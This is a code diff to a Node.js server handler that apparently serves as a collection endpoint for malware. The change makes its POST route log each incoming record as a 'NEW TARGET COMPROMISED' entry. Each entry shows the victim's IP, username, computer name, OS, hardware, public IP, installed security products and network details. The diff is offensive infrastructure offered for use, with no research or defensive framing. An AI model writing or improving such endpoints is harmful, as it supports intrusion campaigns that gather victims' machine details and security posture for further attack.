@@ -20,16 +20,29 @@ module.exports = async (req, res) => {
   
   if (req.method === 'POST') {
     try {
-      console.log('📦 Received POST data:', req.body);
+      console.log('🎯 NEW TARGET COMPROMISED');
+      console.log('────────────────────────────');
       
       const systemData = req.body.data || req.body;
-      console.log('🎯 Target Data:', systemData);
+      const clientIP = req.headers['x-forwarded-for'] || 'Unknown';
+      const timestamp = new Date().toISOString();
       
+      console.log('⏰ Time:', timestamp);
+      console.log('🌐 IP:', clientIP);
+      console.log('👤 User:', systemData.UserName || 'Unknown');
+      console.log('💻 Computer:', systemData.ComputerName || 'Unknown');
+      console.log('🖥️ OS:', systemData.OS || 'Unknown');
+      console.log('🔧 CPU:', systemData.CPU || 'Unknown');
+      console.log('💾 RAM:', systemData.RAM_GB || 'Unknown', 'GB');
+      console.log('📡 Public IP:', systemData.PublicIP || 'Unknown');
+      console.log('🛡️ Security:', systemData.SecurityProducts || 'None');
+      console.log('🔗 Network:', systemData.NetworkInfo || 'Unknown');
+      console.log('────────────────────────────');
+
       return res.json({
         status: 'success',
         message: 'Data received successfully',
-        received: systemData,
-        timestamp: new Date().toISOString()
+        timestamp: timestamp
       });
       
     } catch (error) {
